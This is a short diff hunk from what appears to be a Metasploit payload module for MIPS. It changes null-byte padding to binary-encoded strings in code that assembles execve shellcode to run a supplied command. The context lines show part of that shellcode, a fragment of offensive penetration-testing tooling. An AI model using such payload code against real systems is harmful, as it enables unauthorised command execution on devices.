@@ -65,10 +65,10 @@ module MetasploitModule
       0x00150006,  # or $a2, $zero, $zero          # $a2 = NULL (envp)
       0x002b0101,  # syscall 0x101
     ].pack('V*')
-    shellcode += command_string + "\x00"
+    shellcode += command_string + "\x00".b
 
     # align our shellcode to 4 bytes
-    shellcode += "\x00" while shellcode.bytesize % 4 != 0
+    shellcode += "\x00".b while shellcode.bytesize % 4 != 0
 
     super.to_s + shellcode
   end
